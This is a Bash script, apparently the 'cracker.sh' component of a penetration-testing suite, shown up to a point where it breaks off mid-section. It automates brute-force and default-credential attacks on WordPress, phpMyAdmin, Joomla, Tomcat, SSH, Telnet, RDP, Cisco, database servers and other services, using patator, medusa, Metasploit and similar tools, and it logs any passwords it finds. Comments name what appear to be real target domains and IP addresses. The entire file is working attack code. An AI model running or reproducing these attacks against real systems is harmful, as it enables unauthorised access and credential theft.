#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org

OKBLUE='\033[94m'
THREADS="30"
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'

# RDP crak

#admin/admin, admin/password                       

max_ins=10

echo -e '  ______                  _                         __   ______ '
echo -e ' / _____)                | |                       /  | / __   |'
echo -e '| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |'
echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
echo ''
echo '										version 1.1'
echo '									   daniel.torres@owasp.org'
															
echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"



while getopts ":k:d:l:m:h:e:" OPTIONS
do
            case $OPTIONS in
            k)     ENTIDAD=$OPTARG;;            
            d)     DICTIONARY=$OPTARG;; 
			l)     LANGUAGE=$OPTARG;;   
			m)     MODE=$OPTARG;;      
			e)     EXTRATEST=$OPTARG;;  
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

ENTIDAD=${ENTIDAD:=NULL}
DICTIONARY=${DICTIONARY:=NULL}
MODE=${MODE:=NULL} # vulnerabilidades/hacking
LANGUAGE=${LANGUAGE:=NULL} # en/es
EXTRATEST=${EXTRATEST:=NULL} # oscp

tomcat_passwords_combo="/usr/share/lanscanner/tomcat-passwds.txt"
FILE_SUBDOMAINS="importarMaltego/subdominios-scan.csv"

echo "LANGUAGE $LANGUAGE MODE $MODE ENTIDAD(k) $ENTIDAD DICTIONARY $DICTIONARY EXTRATEST $EXTRATEST"
if [[ ${LANGUAGE} = NULL  ]];then 

cat << "EOF"

Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)

Opciones: 
-k : Nombre de la empresa (Usado para generar diccionario de passwords)
-l : idioma es/en
-m : Mode [vulnerabilidades/hacking]	
 
-d :Diccionario de passwords a usar (opcional)

Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
	cracker.sh -k microsoft -l es

Ejemplo 2: Ataque de diccionario con lista de passwords
	cracker.sh -d passwords.txt -l en
EOF

exit
fi
######################

#rm enumeracion/* 2>/dev/null
#rm .vulnerabilidades/* 2>/dev/null
USERNAMES_FILE="/usr/share/lanscanner/usuarios-top15-$LANGUAGE.txt"

if [ "$LANGUAGE" == "es" ]; then
	admin_user='administrador'
else
	admin_user='administrator'
fi

if [ $EXTRATEST == "oscp" ]; then
	PASSWORDS_FILE="/usr/share/lanscanner/passwords-top500-$LANGUAGE.txt"
else
	PASSWORDS_FILE="/usr/share/lanscanner/passwords-top50-$LANGUAGE.txt"
fi


if [ $DICTIONARY = NULL ] ; then

	if [ $ENTIDAD != NULL ] ; then
		echo "Generando diccionario"
		echo $ENTIDAD > base.txt
		passGen.sh -f base.txt -t online -o online.txt
		cat online.txt $PASSWORDS_FILE | sort | uniq >  passwords.txt			
	else
		echo "PASSWORDS_FILE $PASSWORDS_FILE"
	   cp $PASSWORDS_FILE passwords.txt
	fi
	echo "wordpress" >> passwords.txt	
	echo "joomla" >> passwords.txt	
	echo "drupal" >> passwords.txt
else
	cp $DICTIONARY passwords.txt		
fi

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
	insert-data.py	
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}



find  servicios -size  0 -print0 |xargs -0 rm 2>/dev/null 



old_ifs="$IFS"
IFS=$'\n'  # make newlines the only separator     

if [ -f servicios/admin-web-fingerprint.txt ]
then	  		  
	echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"			
	for line in $(cat servicios/admin-web-fingerprint.txt); do	
		IFS=$old_ifs
		ip_port_path=`echo $line | cut -d ";" -f 1` #https://www.sanmateo.com.bo/wp-login.php https://www.sanmateo.com.bo:8443/wp-login.php		
		fingerprint=`echo $line | cut -d ";" -f 2`
		echo -e "\n\t########### $ip_port_path #######"	
			
		host_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107  - 190.129.69.107:8080
		proto_http=`echo $ip_port_path | cut -d ":" -f 1`
		if [[ ${host_port} == *":"* ]]; then
			port=`echo $host_port | cut -d ":" -f 2`	
		else
			if [[  ${proto_http} == *"https"* ]]; then
				port="443"
			else
				port="80"
			fi
		fi
		host=`echo $host_port | cut -d ":" -f 1`				
		path_web=`echo $ip_port_path | cut -d "/" -f 4-5`	
		path_web=`echo "/"$path_web`

		
		if [[ $fingerprint = *"wordpress"* ]]; then			
			ip_port_path=`echo $ip_port_path |sed 's/wp-login.php//g'`
			echo -e "$OKGREEN \t[+] Wordpress identificado en $ip_port_path $RESET"

			grep -i ",$host" $FILE_SUBDOMAINS 2>/dev/null | grep -qi InMotion
    		greprc=$?
    		if [[ $greprc -eq 0 ]];then 
				echo -e "$OKRED \t[+] Hosting InMotion detectado $RESET"
			else
				echo -e "\t[+] Probando contraseñas comunes ...."
				if [ -f ".vulnerabilidades2/"$host"_"$port"_wpUsers.txt" ]; then
					#https://181.115.188.36:443/				
					for user in $(cat .vulnerabilidades2/"$host"_"$port"_wpUsers.txt |sort| awk '{print $2}'); do
						echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
						echo "WpCrack.py -t $ip_port_path -u $user --p passwords.txt" >> logs/cracking/"$host"_"$user"-"$port"_passwordWordpress.txt
						WpCrack.py -t $ip_port_path -u $user --p passwords.txt >> logs/cracking/"$host"_"$user"-"$port"_passwordWordpress.txt 2>> logs/cracking/"$host"_"$user"-"$port"_passwordWordpress.txt 						
						egrep -iaq "Credenciales" logs/cracking/"$host"_*_passwordWordpress.txt 2>/dev/null
						greprc=$?
						if [[ $greprc -eq 0 ]] ; then	
							echo -e "\t\t[+] Credenciales encontradas"						
							break
						fi
					done
				else
					echo -e "\t\t[+] Probando con usuario admin"	
					echo "WpCrack.py -t $ip_port_path -u admin --p passwords.txt" >> logs/cracking/"$host"_"admin-$port"_passwordWordpress.txt 2>/dev/null
					WpCrack.py -t $ip_port_path -u admin --p passwords.txt >> logs/cracking/"$host"_"admin-$port"_passwordWordpress.txt 2>/dev/null
				fi						
				grep --color=never -ia 'Credenciales' logs/cracking/"$host"_*_passwordWordpress.txt 2>/dev/null | grep -v "passFakeTest123"  > logs/vulnerabilidades/"$host"_"$port"_passwordWordpress.txt
				grep -i credenciales logs/vulnerabilidades/"$host"_"$port"_passwordWordpress.txt > .vulnerabilidades/"$host"_"$port"_passwordWordpress.txt 
			fi			
		fi	
		
		if [[ $fingerprint = *"phpmyadmin"* ]]; then
			echo -e "\t[+] phpMyAdmin identificado"
			echo "passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d \"$path_web\" -u root|admin|wordpress|joomla|drupal|phpmyadmin -f passwords.txt" > logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt 
			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u root -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &


			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u admin -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &			
			passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u phpmyadmin -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &

			#######  wordpress ######
			grep -qi wordpress .enumeracion2/"$host"_"$port"_webData.txt
			greprc=$?
			if [[ $greprc -eq 0 ]];then 
				passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u wordpress -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
			fi

			#######  joomla ######
			grep -qi joomla .enumeracion2/"$host"_"$port"_webData.txt
			greprc=$?
			if [[ $greprc -eq 0 ]];then 
				passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u joomla -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt &
			fi

			#######  drupal ######
			grep -qi drupal .enumeracion2/"$host"_"$port"_webData.txt
			greprc=$?
			if [[ $greprc -eq 0 ]];then 
				passWeb.pl -s $proto_http -t $host -p $port -m phpmyadmin -d "$path_web" -u drupal -f passwords.txt >> logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt&
			fi

					
			sleep 5
			######## wait to finish########
			while true; do
				passWeb_instances=$((`ps aux | grep passWeb | wc -l` - 1)) 
				echo "passWeb_instances $passWeb_instances"
				if [ "$passWeb_instances" -gt 0 ]
				then
					echo -e "\t[i] Todavia hay escaneos de passWeb activos ($passWeb_instances)"  
					sleep 30
				else
					break		  		 
				fi				
			done
			##############################

			egrep --color=never -i 'Password encontrado|sistema sin password' logs/cracking/"$host"_"$port"_passwordPhpMyadmin.txt | sort | uniq > .vulnerabilidades/"$host"_"$port"_passwordPhpMyadmin.txt						
		fi	
		
		if [[ $fingerprint = *"joomla"* ]]; then
			echo -e "\t[+] Joomla identificado"
			echo -e "\t[+] Probando contraseñas comunes ...."
			#cewl -w cewl-passwords.txt -e -a $proto_ip_port
			#cat passwords.txt cewl-passwords.txt | sort | uniq > passwords.txt
			echo "admin" > username.txt
			echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$host"_"$port"_joomla.txt
			msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$host"_"$port"_joomla.txt 2>/dev/null
			grep --color=never 'Successful login' logs/cracking/"$host"_"$port"_joomla.txt | sort | uniq > .vulnerabilidades/"$host"_"$port"_joomla.txt 
			rm username.txt
					
		fi	
		#echo "fingerprint $fingerprint"	
		echo "line $line"	
		if [[ $fingerprint = *"tomcat"* || $line = *'/manager/html'* ]]; then
			echo -e "\t[+] Tomcat identificado ($ip_port_path)"										
			echo -e "\t\t[+] Testing common passwords"	
			#echo "patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo" 
			patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo >> logs/cracking/"$host"_tomcat_passwordDefecto.txt 2>> logs/cracking/"$host"_tomcat_passwordDefecto.txt
			egrep -iq "INFO - 200" logs/cracking/"$host"_tomcat_passwordDefecto.txt
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t\t[i] Password encontrado"				
				# 09:55:46 patator    INFO - 200  22077:-1       0.522 | tomcat:s3cret                      |    25 | HTTP/1.1 200
				creds=`grep --color=never "INFO - 200" logs/cracking/"$host"_tomcat_passwordDefecto.txt | cut -d "|" -f 2 | tr -d ' '`
				echo "$ip_port_path (Creds $creds)" > .vulnerabilidades/"$host"_tomcat_passwordDefecto.txt
			else
				echo -e "\t\t[+] Bruteforcing passwords (user=tomcat)"	
				#echo "patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$host"_tomcat_passwordAdminWeb.txt 				
				patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3 > logs/cracking/"$host"_tomcat_passwordAdminWeb.txt 2>> logs/cracking/"$host"_tomcat_passwordAdminWeb.txt			
				egrep -iq "INFO - 200" logs/cracking/"$host"_tomcat_passwordAdminWeb.txt
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t\t[i] Password encontrado"
					# 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
					password=`grep --color=never "INFO - 200" logs/cracking/"$host"_tomcat_passwordAdminWeb.txt | cut -d "|" -f 2 | tr -d ' '`
					echo "$ip_port_path (Usuario:tomcat Password:$password)" > .vulnerabilidades/"$host"_tomcat_passwordAdminWeb.txt
				fi
			fi
			
			
											
			
			#patator.py http_fuzz method=GET url=$line user_pass=manager:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$host"_"$port"_passTomcat2.txt 2>> logs/cracking/"$host"_"$port"_passTomcat2.txt
			#si encontro el password
#				egrep -iq "200 OK" logs/cracking/"$host"_"$port"_passTomcat2.txt
			#greprc=$?
			#if [[ $greprc -eq 0 ]] ; then			
				#echo -e "\t[i] Password encontrado"
				## 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
				#password=`grep --color=never "200 OK" logs/cracking/"$host"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
				#echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/"$host"_"$port"_passTomcat.txt								
			#fi
			
			#patator.py http_fuzz method=GET url=$line user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 > logs/cracking/"$host"_"$port"_passTomcat3.txt 2>> logs/cracking/"$host"_"$port"_passTomcat3.txt
			#si encontro el password
			#egrep -iq "200 OK" logs/cracking/"$host"_"$port"_passTomcat3.txt
			#greprc=$?
			#if [[ $greprc -eq 0 ]] ; then			
				#echo -e "\t[i] Password encontrado"
				## 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
				#password=`grep --color=never "200 OK" logs/cracking/"$host"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
				#echo "$line (Usuario:root Password:$password)" > .vulnerabilidades/"$host"_"$port"_passTomcat.txt								
			#fi			
		fi	
		
	done			
	insert_data
fi

### SSH #########

if [ -f servicios/ssh.txt ]
then	
	echo -e "$OKBLUE\n\t#################### Testing pass SSH ######################$RESET"	
	for line in $(cat servicios/ssh.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		if [ -f .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt ]; then	
			echo "Usuarios identificados mediante CVE" 
			cat .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt
			for username in $(cat .vulnerabilidades2/"$ip"_"$port"_enumeracionUsuariosSSH.txt); do
				echo "Probando usuario: $username"
				medusa -u $username -P passwords.txt -h $ip -M ssh >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
			done			
		else
			echo "Probando usuario: root"
			#interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P passwords.txt -h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
			interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P passwords.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt 2>> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent &		
		fi	
	
	done	
fi

			
####################

	
### telnet #########
if [ -f servicios/telnet_onlyhost.txt ]
then
	echo -e "$OKBLUE\n\t#################### Testing pass TELNET ######################$RESET"	
	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P passwords.txt -h _target_ -M telnet' >> logs/cracking/_target__23_passwordAdivinadoServ.txt" --silent
	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "medusa -e n -u root -P passwords.txt -h _target_ -M telnet >> logs/cracking/_target__23_passwordAdivinadoServ.txt" --silent
fi

####################


if [ -f servicios/rdp.txt ]; then	
	for line in $(cat servicios/rdp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  
		
		####### user administrador ####
		patator.py rdp_login host=$ip user=$admin_user password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED|ERRCONNECT_CONNECT_CANCELLED' 2> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
		egrep -q  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then	
			echo -e "\t$OKRED[!] Password found \n $RESET"
			creds=`egrep  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK"  logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt | awk '{print $9}'`
			echo "$admin_user:$creds" >> .vulnerabilidades/"$ip"_rdp_passwordAdivinadoWin.txt
		fi	
		##############################

		if [ -z "$ENTIDAD" ]
		then
			####### user $ENTIDAD ####
			patator.py rdp_login host=$ip user=$ENTIDAD password=FILE0 0=passwords.txt -x quit:egrep='OK|PASSWORD_EXPIRED' 2>> logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
			egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then	
				echo -e "\t$OKRED[!] Password found \n $RESET"
				creds=`egrep  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK"  logs/cracking/"$ip"_rdp_passwordAdivinadoWin.txt | awk '{print $9}'`
				echo "$ENTIDAD:$creds" >> .vulnerabilidades/"$ip"_rdp_passwordAdivinadoWin.txt
			fi	
			##############################
		fi

	 done	
	 insert_data

fi



if [ -f servicios/cisco401.txt ]
then	
	
	echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
	  		  
	sed -i '1 i\cisco' passwords.txt	#adicionar password cisco
	echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
	for ip in $(cat servicios/cisco401.txt); do			
		egrep -iq "80/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "[+] Probando $ip"
			echo "patator.py http_fuzz method=GET url=\"http://$ip/\" user_pass=cisco:FILE0 0=passwords.txt -e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
			patator.py http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinadoServ.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Cisco] Usuario:cisco $respuesta" >> .vulnerabilidades/"$ip"_80_passwordAdivinadoServ.txt
			fi				
		fi
					
	done
	insert_data	 
fi



if [ -f servicios/PRTG.txt ]
then 
	  	
	echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
	sed -i '1 i\prtgadmin' passwords.txt	#adicionar password prtgadmin
	for line in $(cat servicios/PRTG.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`								
		echo -e "[+] Probando $ip:$port"
		echo "passWeb.pl -s https -t $ip -p $port -d / -m PRTG -u prtgadmin -f passwords.txt" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
		passWeb.pl -s https -t $ip -p $port -d / -m PRTG -u prtgadmin -f passwords.txt>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
		grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
		echo ""			
	done
	insert_data

fi

if [ -f servicios/pentaho.txt ]
then

	echo -e "\n\t $OKBLUE Encontre sistemas de Pentaho activos.  $RESET"	  
	  		  
	echo -e "$OKBLUE\n\t#################### Testing Pentahoo ######################$RESET"	
	for line in $(cat servicios/pentaho.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
					
		echo -e "[+] Probando $ip"
		passWeb.pl -s https -t $ip -p $port -d / -m pentaho -u admin -f passwords.txt > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
		sleep 2
		grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
		
		echo ""			
	done
	insert_data	
fi



if [ -f servicios/web401.txt ]
then     	
      	  
	echo -e "$OKBLUE\n\t#################### Testing pass web (401) ######################$RESET"	
	for line in $(cat servicios/web401.txt); do
		echo -e "[+] Probando $line"			
		
		if [[ ${line} == *"http"*  ]];then 							
			#line = http://200.87.193.109:80/phpmyadmin/
			ip=`echo $line | cut -d ":" -f2 | tr -d "/"`			
			port=`echo $line | cut -d "/" -f 3| cut -d ":" -f2`	
			
			#probar con usuario admin
			patator.py http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
			fi	
			
			#probar con usuario root
			patator.py http_fuzz method=GET url="$line" user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
			fi
						
		else
			#line=10.0.0.2:80
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			if [[ ${port} == *"443"*  ]];then 	
				#probar con usuario admin
				patator.py http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
				fi	
			
				#probar con usuario root
				patator.py http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
				fi
			fi
		fi
							
	done
	insert_data
fi



#falta
if [ -f servicios/ZKSoftware.txt ]
then

	echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
	for line in $(cat servicios/ZKSoftware.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		sed -i '1i123456' passwords.txt
		echo -e "[+] Probando $ip"		
		echo -e "passWeb.pl -s http -t $ip -p $port -m ZKSoftware -u administrator -f passwords.txt" > logs/cracking/"$ip"_"$port"_passwordZKSoftware.txt
		passWeb.pl -s http -t $ip -p $port -m ZKSoftware -u administrator -f passwords.txt >> logs/cracking/"$ip"_"$port"_passwordZKSoftware.txt
		grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordZKSoftware.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordZKSoftware.txt
		echo ""			
	done
	insert_data
	
fi


if [ -f servicios/mssql.txt ]
then

	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
	 for line in $(cat servicios/mssql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Probando $ip"						
		echo "medusa -e n -u sa -P passwords.txt -h $ip -M mssql" >> logs/cracking/"$ip"_mssql_passwordBD.txt
		medusa -e n -u sa -P passwords.txt -h $ip -M mssql >> logs/cracking/"$ip"_mssql_passwordBD.txt 2>/dev/null
		
		echo -e "\n medusa -e n -u adm -P passwords.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mssql_passwordBD.txt
		medusa -e n -u adm -P passwords.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mssql_passwordBD.txt 2>/dev/null
		
		#echo -e "\n medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mongo_passwordBD.txt
		#medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mongo_passwordBD.txt
		
		grep --color=never SUCCESS logs/cracking/"$ip"_mssql_passwordBD.txt > .vulnerabilidades/"$ip"_mssql_passwordBD.txt
		
	 done	
	 insert_data
fi


if [ -f servicios/oracle.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios oracle activos. $RESET"	   
	
	#https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573  	
				
		export SQLPATH=/opt/oracle/instantclient_18_3
		export TNS_ADMIN=/opt/oracle/instantclient_18_3
		export LD_LIBRARY_PATH=/opt/oracle/instantclient_18_3
		export ORACLE_HOME=/opt/oracle/instantclient_18_3

	 echo -e "$OKBLUE\n\t#################### oracle ######################$RESET"	    
	 for line in $(cat servicios/oracle.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Probando $ip"
		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt 2>/dev/null
		egrep --color=never 'Found' logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_oracle_passwordBD.txt

		SIDS=`grep '|' logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | grep -v oracle-sid-brute | awk '{print $2}'`
		
		for SID in $SIDS; do
			echo -e "[+] Probando SID $SID"
			odat.sh passwordguesser -s $ip -p 1521 -d $SID --accounts-file /usr/share/wordlists/oracle_default_userpass.txt >> logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt 
		done		
		
	 done	
	 insert_data
fi

if [ -f servicios/mongoDB.txt ]
then
	echo -e "$OKBLUE #################### MongoDB (`wc -l servicios/mongoDB.txt`) ######################$RESET"
	for line in $(cat servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"
		echo "nmap -n -sT -sV -p $port -Pn --script=mongodb-brute $ip"  > logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		nmap -n -sT -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		grep "|" logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_mongo_passwordBD.txt 				
	done	
	#insert clean data	
	insert_data	
fi

if [ -f servicios/postgres.txt ]
then

	echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
	 sed -i '1 i\postgres' passwords.txt	#adicionar password postgres
	 for line in $(cat servicios/postgres.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`			
		
		echo -e "[+] Probando $ip"
		echo "medusa -e n -u postgres -P passwords.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
		medusa -e n -u postgres -P passwords.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
		
		echo -e "\n medusa -e n -u pgsql -P passwords.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
		medusa -e n -u pgsql -P passwords.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
		
		#echo -e "\nmedusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
		#medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
		
		grep --color=never SUCCESS logs/cracking/"$ip"_5432_passwordBD.txt > .vulnerabilidades/"$ip"_5432_passwordBD.txt
		
	 done	
	 insert_data
fi


if [ -f servicios/MikroTik.txt ]
then
	  		      	  
